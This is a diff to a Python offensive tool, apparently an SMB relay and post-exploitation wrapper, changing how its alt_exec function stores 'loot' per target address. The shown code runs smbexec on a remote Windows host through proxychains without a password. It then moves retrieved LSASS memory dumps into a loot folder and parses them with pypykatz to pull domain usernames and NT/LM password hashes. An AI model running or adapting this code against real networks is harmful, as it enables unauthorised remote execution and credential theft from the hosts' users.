@@ -462,16 +462,18 @@ def alt_exec(command,domain, username, address):
     os.system('sudo proxychains python3 smbexec-shellless.py {}/{}@{} -no-pass \'{}\''.format(domain, username, address,command))
 
     try:  # move the share file to the loot dir
-        os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
-        printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
+        os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, address))# move from /var/tmp to loot
+        os.system("sudo mv {}/loot/{}/{}/* {}/loot/{}".format(cwd, address, share_name, cwd, address)) # move from the share name to the loot dir
+        os.system("sudo rm -r {}/loot/{}/{}".format(cwd, address, share_name)) # remove the share name folder
+        printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, address))
     except BaseException as e:
         pass
 
     if options.ap:  # autoparse
         printnlog("\n[parsing files]")
-        os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
-        os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
-        os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
+        os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, address, cwd, address))
+        os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, address, cwd, address))
+        os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, address, cwd, address, cwd, address))
 
 
     printnlog("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
@@ -509,7 +511,7 @@ def alt_exec(command,domain, username, address):
         pass
 
     try:
-        os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
+        os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, address))
     except BaseException as e:
         pass
 
